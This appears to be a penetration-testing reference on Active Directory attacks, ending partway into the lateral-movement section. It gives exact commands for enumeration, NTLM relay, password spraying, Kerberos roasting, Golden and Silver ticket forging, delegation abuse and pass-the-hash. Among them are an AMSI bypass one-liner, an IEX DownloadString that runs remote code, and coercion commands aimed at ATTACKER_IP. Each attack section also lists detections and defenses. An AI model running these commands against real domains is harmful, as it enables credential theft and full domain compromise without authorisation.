# Active Directory Attacks

> **Audience**: Penetration testers and red teamers. Every major AD attack with exact tool commands, ATT&CK mappings, detection event IDs, and defenses.

---

## Table of Contents

- [1. AD Fundamentals for Attackers](#1-ad-fundamentals-for-attackers)
- [2. Enumeration & Reconnaissance](#2-enumeration--reconnaissance)
- [3. Credential Attacks](#3-credential-attacks)
- [4. Kerberos Attacks](#4-kerberos-attacks)
- [5. Lateral Movement](#5-lateral-movement)
- [6. Credential Harvesting](#6-credential-harvesting)
- [7. Domain Persistence](#7-domain-persistence)
- [8. AD Certificate Services (ADCS) Attacks — ESC1–ESC8](#8-ad-certificate-services-adcs-attacks--esc1esc8)
- [9. Domain Trust Attacks](#9-domain-trust-attacks)
- [10. Tools Quick Reference](#10-tools-quick-reference)
- [11. Detection & Defense Summary](#11-detection--defense-summary)

---

## 1. AD Fundamentals for Attackers

### Core AD Components

| Component | Description | Attacker Relevance |
|-----------|-------------|-------------------|
| **Domain** | Administrative boundary for users, computers, policies | Primary target scope |
| **Forest** | Collection of domains sharing schema and global catalog | Cross-domain attack surface |
| **Trust** | Authentication relationship between domains/forests | Lateral movement across domains |
| **OU (Organizational Unit)** | Container for applying GPOs | GPO abuse, delegation misconfig |
| **GPO (Group Policy Object)** | Policy applied to OUs/machines | Persistence, privilege escalation |
| **Schema** | Defines AD object types and attributes | Schema Admin group = full control |
| **LDAP** | Directory protocol for AD queries | Enumeration, AS-REP roasting |
| **DNS** | Name resolution integrated with AD | DNS Admin abuse (DLL injection) |
| **Kerberos** | Default authentication protocol | Kerberoasting, Golden/Silver tickets |
| **SYSVOL** | Replicated share on all DCs | GPP password discovery |

### Key AD Object Types

- **Users**: Standard and privileged accounts; service accounts with SPNs are Kerberoast targets
- **Computers**: Domain-joined machines; machine accounts (COMPUTER$) can hold Kerberos tickets
- **Groups**: Security vs. distribution; nested group membership is a common privilege escalation path
- **Service Accounts**: Regular user accounts running services; often have weak passwords and broad permissions
- **Group Managed Service Accounts (gMSA)**: Password auto-rotated by AD, no human-known password; read permission = compromise

### Important AD Groups

| Group | Default Privileges | Why Attackers Target It |
|-------|-------------------|------------------------|
| **Domain Admins** | Full control over domain | Ultimate goal for internal pentests |
| **Enterprise Admins** | Full control over all domains in forest | Cross-forest/child-to-parent escalation |
| **Schema Admins** | Modify AD schema | Persistent backdoors in schema |
| **Administrators** | Local admin on all DCs | Can dump NTDS.dit |
| **Account Operators** | Create/modify accounts (except privileged) | Create backdoor accounts |
| **Server Operators** | Start/stop services on DCs | Service manipulation for SYSTEM |
| **Backup Operators** | Backup any file (including NTDS.dit) | NTDS.dit extraction |
| **Print Operators** | Load print drivers on DCs | Driver abuse for SYSTEM |
| **DNSAdmins** | Manage DNS zones | DLL injection via DNS service restart |

### Tiered Access Model (Tier 0/1/2)

```
Tier 0: Domain Controllers, AD Admin workstations, ADFS, Azure AD Connect
Tier 1: Member servers, application servers
Tier 2: User workstations, end-user devices
```

**Why flattening creates attack paths**: When Tier 0 admins log into Tier 2 machines, their credentials cache on those machines. Any Tier 2 compromise (phishing, local exploit) yields DA credentials. BloodHound shortest paths exploit this directly.

### AdminSDHolder

AdminSDHolder is an AD object whose ACL is propagated to all privileged groups by the SDProp background process (runs every 60 minutes). If you modify the AdminSDHolder ACL to grant a backdoor account permissions, those permissions will be pushed to Domain Admins, Enterprise Admins, and other protected groups within 60 minutes — and will survive if manually removed from those groups.

**Protected groups** (SDProp targets): Account Operators, Administrators, Backup Operators, Domain Admins, Domain Controllers, Enterprise Admins, Print Operators, Read-only Domain Controllers, Replicator, Schema Admins, Server Operators.

### ACL / ACE Types Relevant to Attacks

| Right | Description | Attack Path |
|-------|-------------|------------|
| **GenericAll** | Full control | Reset password, add to group, write any attribute |
| **GenericWrite** | Write any property | Write SPN for Kerberoasting, write msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD |
| **WriteOwner** | Change object owner | Take ownership → grant GenericAll to self |
| **WriteDACL** | Modify ACL | Grant self GenericAll → full compromise |
| **ForceChangePassword** | Reset password without knowing current | Account takeover without detection |
| **AllExtendedRights** | All extended rights including replication | DCSync capability |
| **AddMember** | Add members to group | Add self to Domain Admins |
| **Self** | Specific self-rights (e.g., self-membership) | Add self to group if Self-Membership extended right |
| **Owns** | Object ownership | Take ownership → WriteDACL → GenericAll |

---

## 2. Enumeration & Reconnaissance

### BloodHound (Gold Standard for Attack Path Analysis)

BloodHound ingests AD data and maps attack paths graphically using graph theory (shortest path algorithms).

```bash
# SharpHound collection — run on domain-joined machine
SharpHound.exe -c All --zipfilename bloodhound.zip
SharpHound.exe -c All,GPOLocalGroup --zipfilename bloodhound_full.zip

# Invoke-BloodHound (PowerShell in-memory)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -ZipFileName bloodhound.zip

# bloodhound-python (from attacker Linux box, requires domain creds)
bloodhound-python -u user -p password -d corp.local -ns 192.168.1.10 -c All
bloodhound-python -u user -p password -d corp.local -ns 192.168.1.10 -c All --zip

# Start BloodHound (after importing zip)
# neo4j console &
# bloodhound &
```

**Key BloodHound built-in queries:**
- Shortest Path to Domain Admins
- Find All Domain Admins
- Find Principals with DCSync Rights
- Computers Where Domain Admins Are Logged In
- Find AS-REP Roastable Users
- Find Kerberoastable Users (High Value)
- Users with Most Privileges

**Custom Cypher queries (Neo4j console):**

```cypher
-- Find all users with any path to DA within 5 hops
MATCH p=shortestPath((u:User)-[*1..5]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p

-- Find computers where Domain Admins are logged in
MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
RETURN c.name, u.name

-- Find users with GenericAll on any group
MATCH (u:User)-[:GenericAll]->(g:Group)
RETURN u.name, g.name

-- Find all Kerberoastable users and their group membership
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames

-- Find ACL paths from owned users to DA
MATCH p=shortestPath((u:User {owned:true})-[r:GenericAll|GenericWrite|WriteOwner|WriteDACL|Owns|AddMember|ForceChangePassword*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p

-- Find computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name, c.operatingsystem
```

### PowerView (Manual LDAP Enumeration)

```powershell
# Load PowerView
Import-Module .\PowerView.ps1
# Or bypass AMSI: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ── Domain Information ──────────────────────────────────────────────────────
Get-Domain                          # Current domain info
Get-DomainController                # List DCs
Get-DomainTrust                     # Trust relationships
Get-ForestDomain                    # All domains in forest
Get-ForestGlobalCatalog             # Global catalog servers

# ── User Enumeration ────────────────────────────────────────────────────────
Get-DomainUser | select samaccountname, description, pwdlastset, logoncount, admincount
Get-DomainUser -SPN                 # Kerberoastable accounts (have SPNs)
Get-DomainUser -PreauthNotRequired  # AS-REP roastable accounts
Get-DomainUser -UACFilter DONT_REQ_PREAUTH  # Same as above
Get-DomainUser -Identity "administrator" -Properties *

# Find users with descriptions containing "pass"
Get-DomainUser | where {$_.description -match "pass"} | select samaccountname, description

# ── Computer Enumeration ────────────────────────────────────────────────────
Get-DomainComputer | select name, operatingsystem, lastlogondate, dnshostname
Get-DomainComputer -Unconstrained   # Computers with unconstrained delegation
Get-DomainComputer -TrustedToAuth   # Constrained delegation machines
Get-DomainComputer -LDAPFilter "(ms-mcs-admpwd=*)"  # LAPS-enabled machines

# ── Group Enumeration ───────────────────────────────────────────────────────
Get-DomainGroup | select name, description, admincount
Get-DomainGroupMember "Domain Admins" -Recurse
Get-DomainGroupMember "Enterprise Admins" -Recurse

# ── ACL Enumeration ─────────────────────────────────────────────────────────
# Find interesting ACLs on Domain Admins group
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | where {$_.ActiveDirectoryRights -match "Write|GenericAll|All"}

# Find all interesting ACLs across domain (slow but thorough)
Find-InterestingDomainAcl -ResolveGUIDs | where ObjectAceType -ne "Self"

# Find ACLs where specific user has rights
Get-DomainObjectAcl -ResolveGUIDs | where {$_.SecurityIdentifier -eq (Get-DomainUser "lowprivuser").objectsid}

# Find users with DCSync rights
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs | where {
  ($_.ObjectAceType -match "Replication-Get|DS-Replication") -and
  ($_.AceType -eq "AccessAllowedObjectAce")
}

# ── GPO Enumeration ─────────────────────────────────────────────────────────
Get-DomainGPO | select displayname, gpcfilesyspath, whenchanged
Get-DomainGPOLocalGroup             # GPOs setting local admin groups (find paths to local admin)
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity TARGET01  # Local admins on target

# ── Session / Logon Enumeration ─────────────────────────────────────────────
Get-NetLoggedon -ComputerName DC01  # Requires admin rights on target
Get-NetSession -ComputerName DC01
Invoke-UserHunter                   # Find where DAs are logged in (loud!)
Invoke-UserHunter -CheckAccess      # Check if current user has admin access to those machines

# ── Share Enumeration ───────────────────────────────────────────────────────
Invoke-ShareFinder -CheckShareAccess
Find-InterestingFile -Path \\DC01\SYSVOL -Include *password*,*credential*,*.xml
```

### ldapdomaindump

```bash
# Dump all domain info to HTML/JSON/CSV files
ldapdomaindump -u 'CORP\user' -p 'password' ldap://192.168.1.10 -o /tmp/ldap/
ldapdomaindump -u 'CORP\user' -p 'password' ldaps://192.168.1.10 -o /tmp/ldap/

# With NTLM hash
ldapdomaindump -u 'CORP\user' --ntlm ':NTLM_HASH' ldap://192.168.1.10 -o /tmp/ldap/

# Output files: domain_users.json, domain_computers.json, domain_groups.json,
# domain_trusts.json, domain_policy.json — plus HTML reports
```

### CrackMapExec / NetExec Enumeration

```bash
# Host discovery and OS detection
nxc smb 192.168.1.0/24

# Authenticate and enumerate
nxc smb 192.168.1.0/24 -u user -p password --shares
nxc smb 192.168.1.0/24 -u user -p password --users
nxc smb 192.168.1.0/24 -u user -p password --groups
nxc smb 192.168.1.0/24 -u user -p password --loggedon-users
nxc smb 192.168.1.0/24 -u user -p password --pass-pol
nxc smb 192.168.1.0/24 -u user -p password --rid-brute

# LDAP enumeration
nxc ldap 192.168.1.10 -u user -p password --active-users
nxc ldap 192.168.1.10 -u user -p password --asreproast asrep.txt
nxc ldap 192.168.1.10 -u user -p password --kerberoasting kerberoast.txt
nxc ldap 192.168.1.10 -u user -p password --trusted-for-delegation
nxc ldap 192.168.1.10 -u user -p password --gmsa          # Readable gMSA passwords

# WinRM / SSH enumeration
nxc winrm 192.168.1.0/24 -u user -p password
```

### GPP Passwords (MS14-025)

```bash
# Find GPP passwords in SYSVOL (Groups.xml, ScheduledTasks.xml, etc.)
# Impacket
impacket-Get-GPPPassword -xmlfile '/path/to/Groups.xml'

# CrackMapExec (automatic)
nxc smb 192.168.1.10 -u user -p password -M gpp_password
nxc smb 192.168.1.10 -u user -p password -M gpp_autologin

# Manual PowerShell
findstr /S /I cpassword \\corp.local\SYSVOL\corp.local\Policies\*.xml
# Decrypt cpassword (AES key published by Microsoft in MS14-025)
gppdecrypt.rb [cpassword_value]
```

---

## 3. Credential Attacks

### LLMNR / NBT-NS Poisoning (T1557.001)

**Mechanism**: When a hostname lookup fails DNS, Windows falls back to LLMNR (Link-Local Multicast Name Resolution) and NBT-NS broadcasts. An attacker on the same network responds to these broadcasts, causing the victim to authenticate to the attacker's machine and sending an NTLMv2 hash.

```bash
# Responder — listen, poison LLMNR/NBT-NS, and capture NTLMv2 hashes
responder -I eth0 -dwv
# -d: DHCP injection
# -w: Start WPAD rogue proxy
# Captured hashes: /usr/share/responder/logs/

# Crack NTLMv2 hashes
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 ntlmv2.txt

# mitm6 — IPv6 DNS poisoning (works even when LLMNR/NBT-NS disabled)
mitm6 -d corp.local
# Combine with ntlmrelayx for LDAP relay (RBCD)
impacket-ntlmrelayx -6 -t ldaps://DC01.corp.local -wh attacker-wpad.corp.local --delegate-access
```

- **Detection**: Event 4648 (explicit credential use), Zeek DNS/LLMNR logs, Responder-specific LLMNR response patterns, multicast DNS queries to non-standard respondents
- **ATT&CK**: T1557.001 (LLMNR/NBT-NS Poisoning and SMB Relay)
- **Defense**: Disable LLMNR via GPO (Computer Configuration → Administrative Templates → Network → DNS Client → Turn Off Multicast Name Resolution = Enabled); disable NBT-NS in adapter settings or via DHCP option 001; deploy WPAD detection; enable SMB signing

### NTLM Relay Attack (T1557.001)

**Mechanism**: Instead of cracking the captured NTLMv2 hash, relay the authentication attempt to another machine. If SMB signing is not required, the relay authenticates as the victim on the target.

```bash
# Step 1: Edit Responder config — disable SMB and HTTP servers
# /etc/responder/Responder.conf:
#   SMB = Off
#   HTTP = Off

# Step 2: Start Responder for capture/poisoning only
responder -I eth0 -dwv

# Step 3: Start ntlmrelayx
# Relay to multiple SMB targets
impacket-ntlmrelayx -tf targets.txt -smb2support -l loot/
# Relay to LDAP for RBCD attack (force computer account creation)
impacket-ntlmrelayx -tf dc.corp.local -smb2support --delegate-access
# Create SOCKS proxy via relay
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
# After SOCKS, use proxychains for tooling
proxychains impacket-secretsdump -no-pass corp.local/user@TARGET01
# Relay to ADCS web enrollment
impacket-ntlmrelayx -t http://CA.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template Machine

# Coerce authentication using PrinterBug / SpoolSample
python3 printerbug.py corp.local/user:password@DC01.corp.local ATTACKER_IP
# Or PetitPotam (no credentials needed in some configs)
python3 PetitPotam.py ATTACKER_IP DC01.corp.local
```

- **Defense**: Enable SMB signing required (GPO: Microsoft Network Server: Digitally sign communications always = Enabled); LDAP signing + channel binding; EPA for HTTP; disable NTLM where possible; monitor relay tool signatures

### Password Spraying (T1110.003)

**Mechanism**: Try one or a few passwords against many accounts. Avoids lockout by staying under the bad password threshold.

```bash
# Kerbrute (fast, uses Kerberos pre-auth — less noise than SMB)
kerbrute passwordspray -d corp.local --dc 192.168.1.10 users.txt 'Winter2024!'
kerbrute userenum -d corp.local --dc 192.168.1.10 users.txt  # Username enumeration first

# Build username list from LDAP (if you have creds)
ldapdomaindump -u 'CORP\user' -p 'password' ldap://DC01 -o /tmp/
# Or from OSINT: LinkedIn → username generator

# DomainPasswordSpray (PowerShell — uses domain lockout policy automatically)
Import-Module DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -UserList users.txt -Password 'Winter2024!' -OutFile spray_results.txt
Invoke-DomainPasswordSpray -Password 'Spring2024!' -Delay 30 -Verbose  # Built-in lockout-aware delay

# NetExec spray
nxc smb 192.168.1.10 -u users.txt -p 'Winter2024!' --continue-on-success
nxc smb 192.168.1.10 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

# Spray timing guidance
# Default AD lockout: 5 bad passwords / 30 min window
# Safe spray rate: 1 password attempt per user per 31 minutes
```

- **Detection**: Event 4625 (failed logon) spikes from single source IP, Smart Lockout in Entra ID, UEBA baseline deviation
- **Defense**: Smart lockout policy, Entra Password Protection (banned passwords list synced to on-prem), monitor 4625 bursts, Conditional Access with MFA

---

## 4. Kerberos Attacks

### Kerberoasting (T1558.003)

**Mechanism**: Any domain user can request a TGS for any service account with an SPN. The TGS is encrypted with the service account's NTLM hash. Extract and crack offline.

```bash
# ── Linux (Impacket) ─────────────────────────────────────────────────────────
impacket-GetUserSPNs corp.local/user:password -dc-ip 192.168.1.10 -request -outputfile kerberoast.txt
# Request RC4 specifically (faster to crack)
impacket-GetUserSPNs corp.local/user:password -dc-ip 192.168.1.10 -request -outputfile kerberoast.txt -target-domain corp.local

# ── Windows (Rubeus) ─────────────────────────────────────────────────────────
Rubeus.exe kerberoast /outfile:hashes.txt /rc4opsec    # RC4 only
Rubeus.exe kerberoast /outfile:hashes.txt /aes         # AES (slower to crack)
Rubeus.exe kerberoast /user:svc_sql /outfile:sql.txt   # Target specific account

# ── PowerView identification ─────────────────────────────────────────────────
Get-DomainUser -SPN | select samaccountname, serviceprincipalname, admincount, pwdlastset

# ── Crack TGS hashes ─────────────────────────────────────────────────────────
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --rules-file rules/best64.rule
# AES-256 TGS (mode 19700)
hashcat -m 19700 kerberoast_aes.txt /usr/share/wordlists/rockyou.txt
```

- **Detection**: Event 4769 (Kerberos Service Ticket Operations) with Ticket Encryption Type 0x17 (RC4-HMAC) from non-DC source, unusually high volume of 4769 events from single workstation
- **ATT&CK**: T1558.003
- **Defense**: Use strong random passwords (25+ chars) for all service accounts; configure AES-only Kerberos encryption (set `msDS-SupportedEncryptionTypes = 24` — AES128+AES256 only); migrate service accounts to gMSA (passwords 240-char, auto-rotated)

### AS-REP Roasting (T1558.004)

**Mechanism**: Accounts with "Do not require Kerberos preauthentication" enabled send an AS-REP that is partially encrypted with the user's NTLM hash — extractable without authenticating first.

```bash
# ── No creds required (if you have a user list) ─────────────────────────────
impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.10 -outputfile asrep.txt
impacket-GetNPUsers corp.local/ -no-pass -dc-ip 192.168.1.10 -request  # Auto-enumerate from domain

# ── With domain creds ────────────────────────────────────────────────────────
impacket-GetNPUsers corp.local/user:password -dc-ip 192.168.1.10 -request -outputfile asrep.txt

# ── Windows (Rubeus) ─────────────────────────────────────────────────────────
Rubeus.exe asreproast /outfile:asrep_hashes.txt
Rubeus.exe asreproast /user:asrep_user /outfile:specific.txt

# ── PowerView identification ─────────────────────────────────────────────────
Get-DomainUser -UACFilter DONT_REQ_PREAUTH | select samaccountname, pwdlastset

# ── Crack ─────────────────────────────────────────────────────────────────────
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
```

- **Detection**: Event 4768 (Kerberos Authentication Service) with Pre-Authentication Type = 0 (no preauth), especially from unusual sources
- **ATT&CK**: T1558.004
- **Defense**: Never disable Kerberos pre-authentication (it is enabled by default; audit accounts where it's disabled); monitor for 4768 with PreAuth type 0

### Golden Ticket (T1558.001)

**Mechanism**: With the krbtgt NTLM hash, forge a Ticket-Granting Ticket (TGT) for any user with any group membership. Does not require communication with the DC to generate.

**Requirements**: krbtgt NTLM hash, Domain SID, domain name. Any username (can be non-existent).

```bash
# ── Get krbtgt hash ──────────────────────────────────────────────────────────
# Via DCSync (requires DA or equivalent)
impacket-secretsdump corp.local/administrator:password@DC01.corp.local -just-dc-user krbtgt
# Output: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:HASH_HERE:::

# Get domain SID
impacket-lookupsid corp.local/user:password@DC01.corp.local | grep "Domain SID"
# Or: Get-DomainSID (PowerView)

# ── Mimikatz Golden Ticket ───────────────────────────────────────────────────
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXX /krbtgt:KRBTGT_HASH /ptt
# Options:
# /id:500          — RID (500 = Administrator)
# /groups:512,513,518,519,520  — Group RIDs (DA, DU, Schema Admins, EA, Group Policy Creator Owners)
# /endin:600       — Ticket lifetime in minutes
# /renewmax:10080  — Renewable lifetime in minutes
# /ptt             — Pass the ticket into current session
# /ticket:golden.kirbi  — Save to file instead of PTT

# ── Impacket Golden Ticket ───────────────────────────────────────────────────
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXXXX -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local

# ── Use ticket ───────────────────────────────────────────────────────────────
# Mimikatz ptt (already done above with /ptt)
# Rubeus ptt from file
Rubeus.exe ptt /ticket:golden.kirbi
# Access resources
dir \\DC01\C$
```

- **Detection**: Event 4769 with anomalous ticket parameters (lifetime > 10h, KVNO mismatch), Event 4672 (special privilege logon) with unusual SIDs in token, PAC validation failures — but Golden Tickets bypass most standard detection when using valid domain parameters
- **ATT&CK**: T1558.001
- **Defense**: Rotate krbtgt password TWICE with 10+ hour gap between rotations (to invalidate all existing TGTs); enable Credential Guard; add DAs to Protected Users group; monitor 4769 anomalies

### Silver Ticket (T1558.002)

**Mechanism**: Forge a service ticket (TGS) for a specific service using that service account's NTLM hash. Does not require krbtgt hash, but access is limited to that one service.

**Requirements**: Service account NTLM hash, Domain SID, target SPN.

```bash
# Get service account hash (multiple methods: Kerberoast, PtH, secretsdump)

# ── Mimikatz Silver Ticket ───────────────────────────────────────────────────
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXX /target:SERVER01.corp.local /service:cifs /rc4:SERVICE_HASH /ptt
# /target: FQDN of target machine
# /service: service class (see below)

# Common services for Silver Tickets:
# cifs     — File share access (\\SERVER01\C$)
# http     — IIS/web services
# host     — Scheduled tasks, WMI, PowerShell remoting
# ldap     — LDAP queries (DCSync if targeting DC)
# mssql    — SQL Server
# wsman    — WinRM (PowerShell remoting)
# rpcss    — DCOM
# krbtgt   — Effectively Golden Ticket territory

# ── Impacket ─────────────────────────────────────────────────────────────────
impacket-ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-XXXXXX -domain corp.local -spn cifs/SERVER01.corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@SERVER01.corp.local
```

- **Detection**: Harder to detect than Golden Ticket because no DC communication needed; look for tickets with no corresponding AS-REQ (4768) or TGS-REQ (4769) for the issuing DC
- **ATT&CK**: T1558.002
- **Defense**: Rotate service account passwords regularly; use gMSA; enable PAC validation (validate PAC on every service request)

### Diamond Ticket

**Mechanism**: Similar to Golden Ticket but requests a legitimate TGT from the DC first, then decrypts and modifies the PAC (using krbtgt key) to add privileged group memberships. Bypasses PAC validation anomaly detection.

```bash
# Rubeus Diamond Ticket
Rubeus.exe diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 /groups:512 /krbkey:KRBTGT_AES256_KEY /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### Pass-the-Ticket (T1550.003)

```bash
# ── Export tickets from memory ───────────────────────────────────────────────
# Mimikatz
mimikatz # sekurlsa::tickets /export     # Export all tickets as .kirbi files
# Rubeus
Rubeus.exe dump /nowrap                   # Dump all tickets (base64)
Rubeus.exe dump /service:krbtgt /nowrap  # Only TGTs
Rubeus.exe dump /user:administrator /nowrap

# ── Import/inject ticket ─────────────────────────────────────────────────────
# Mimikatz
mimikatz # kerberos::ptt ticket.kirbi
# Rubeus
Rubeus.exe ptt /ticket:BASE64_TICKET
Rubeus.exe ptt /ticket:ticket.kirbi
# Verify
klist

# ── From Linux ───────────────────────────────────────────────────────────────
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass corp.local/administrator@TARGET.corp.local
```

### Unconstrained Delegation Abuse (T1558)

**Mechanism**: Computers/accounts with unconstrained delegation store TGTs of any user that authenticates to them. Compromise such a host → collect TGTs → reuse them (including DC machine account TGT for DCSync).

```bash
# ── Find unconstrained delegation machines ───────────────────────────────────
Get-DomainComputer -Unconstrained | select name, dnshostname, operatingsystem
Get-ADComputer -Filter {TrustedForDelegation -eq $True} | select Name

# ── Coerce DC authentication using PrinterBug (SpoolSample) ─────────────────
# Run from attacker machine (or from inside network)
SpoolSample.exe DC01.corp.local UNCONSTRAINED_HOST.corp.local
# Or Coercer (tries multiple coercion methods)
python3 Coercer.py -u user -p password -d corp.local -t DC01.corp.local -l UNCONSTRAINED_HOST.corp.local

# ── On UNCONSTRAINED_HOST, monitor for incoming TGTs ────────────────────────
# Rubeus monitor (runs continuously)
Rubeus.exe monitor /interval:5 /filteruser:DC01$
# Wait for DC01$ TGT to appear, then:
Rubeus.exe ptt /ticket:BASE64_TGT_OF_DC01$

# ── With DC machine account TGT, perform DCSync ──────────────────────────────
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt /dc:DC01.corp.local
# Or via Impacket with Kerberos ticket
export KRB5CCNAME=DC01_machine.ccache
impacket-secretsdump -k -no-pass corp.local/DC01\$@DC01.corp.local
```

### Constrained Delegation Abuse (S4U2Proxy)

**Mechanism**: Accounts configured for constrained delegation can impersonate any user to a specific set of services via the S4U2Self + S4U2Proxy extension. If "Protocol Transition" is allowed (TRUSTED_TO_AUTH_FOR_DELEGATION flag), no prior Kerberos auth from the impersonated user is required.

```bash
# ── Find constrained delegation accounts ────────────────────────────────────
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name, msds-allowedtodelegateto

# ── Rubeus S4U attack ────────────────────────────────────────────────────────
# If you have the account's NTLM hash or password
Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/fileserver.corp.local /ptt
# Alternate SPN (service class only, hostname is implied)
Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/fileserver.corp.local /altservice:http /ptt

# ── Impacket ─────────────────────────────────────────────────────────────────
impacket-getST -spn cifs/fileserver.corp.local -impersonate administrator corp.local/svc_web:password
impacket-getST -spn cifs/fileserver.corp.local -impersonate administrator -hashes :NTLM_HASH corp.local/svc_web
export KRB5CCNAME=administrator.ccache
impacket-smbclient -k -no-pass fileserver.corp.local
```

### Resource-Based Constrained Delegation (RBCD) (T1558)

**Mechanism**: If you have GenericWrite/GenericAll over a computer object, you can configure it to accept delegated authentication from a computer account you control. Then use S4U to impersonate any user (including Domain Admin) on that target.

```powershell
# ── Requirements ─────────────────────────────────────────────────────────────
# 1. GenericWrite or GenericAll on target computer object
# 2. Ability to create a computer account (default: any authenticated user, up to MachineAccountQuota = 10)
#    OR an existing computer account you control

# ── Step 1: Create attacker-controlled computer account ──────────────────────
Import-Module Powermad.ps1
New-MachineAccount -MachineAccount fakecomputer -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Verbose

# ── Step 2: Build security descriptor with fakecomputer's SID ────────────────
$ComputerSid = Get-DomainComputer fakecomputer -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# ── Step 3: Write msDS-AllowedToActOnBehalfOfOtherIdentity on target ─────────
Get-DomainComputer TARGET01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
# Verify
Get-DomainComputer TARGET01 -Properties 'msds-allowedtoactonbehalfofotheridentity'

# ── Step 4: S4U2Self + S4U2Proxy to impersonate admin ───────────────────────
$fakehash = ConvertTo-NTHash 'Password123!'
Rubeus.exe s4u /user:fakecomputer$ /rc4:$fakehash /impersonateuser:administrator /msdsspn:cifs/TARGET01.corp.local /ptt
# Or with Impacket
impacket-getST -spn cifs/TARGET01.corp.local -impersonate administrator -dc-ip 192.168.1.10 corp.local/fakecomputer$:'Password123!'
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass corp.local/administrator@TARGET01.corp.local

# ── Cleanup ──────────────────────────────────────────────────────────────────
Set-DomainObject TARGET01 -Clear 'msds-allowedtoactonbehalfofotheridentity'
```

---

## 5. Lateral Movement

### Pass-the-Hash (T1550.002)

**Mechanism**: Use NTLM hash directly for authentication — no plaintext password needed. NTLM authentication accepts the hash as the credential.

```bash
# ── Impacket suite ───────────────────────────────────────────────────────────
impacket-psexec -hashes :NTLM_HASH corp.local/administrator@192.168.1.20
impacket-wmiexec -hashes :NTLM_HASH corp.local/administrator@192.168.1.20
impacket-smbexec -hashes :NTLM_HASH corp.local/administrator@192.168.1.20
impacket-atexec -hashes :NTLM_HASH corp.local/administrator@192.168.1.20 "whoami"
# Format for LM:NTLM (use aad3b435... for empty LM hash)
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH corp.local/administrator@192.168.1.20

# ── NetExec (CrackMapExec) PtH ───────────────────────────────────────────────
nxc smb 192.168.1.0/24 -u administrator -H NTLM_HASH
nxc smb 192.168.1.0/24 -u administrator -H NTLM_HASH --local-auth  # Local account
nxc smb 192.168.1.0/24 -u administrator -H NTLM_HASH -x "whoami /all"  # Execute command
nxc winrm 192.168.1.0/24 -u administrator -H NTLM_HASH

# ── Mimikatz PtH ─────────────────────────────────────────────────────────────
mimikatz # sekurlsa::pth /user:administrator /domain:corp.local /ntlm:HASH /run:cmd.exe
# Spawns new process with stolen identity — use klist to verify Kerberos tickets

# ── Evil-WinRM PtH ───────────────────────────────────────────────────────────
evil-winrm -i TARGET01 -u administrator -H NTLM_HASH
```

- **Detection**: Event 4624 (Type 3 logon, NTLM provider) from unexpected source; NtLmSsp provider in audit logs; no corresponding 4768/4769 (no Kerberos)
- **ATT&CK**: T1550.002
- **Defense**: Protected Users group (blocks NTLM caching and NTLM auth for members); Windows Defender Credential Guard (isolates LSASS); restrict NTLM (Network security: Restrict NTLM); LAPS for local accounts

### Over-Pass-the-Hash (T1550.003)

Convert an NTLM hash directly into a Kerberos TGT — avoids NTLM network traffic, bypasses NTLM blocking.

```bash
# Mimikatz — spawns new process with Kerberos TGT
mimikatz # sekurlsa::pth /user:administrator /domain:corp.local /ntlm:HASH /run:powershell.exe
# In the new PS window, Kerberos tickets are requested automatically
klist  # Verify TGT present

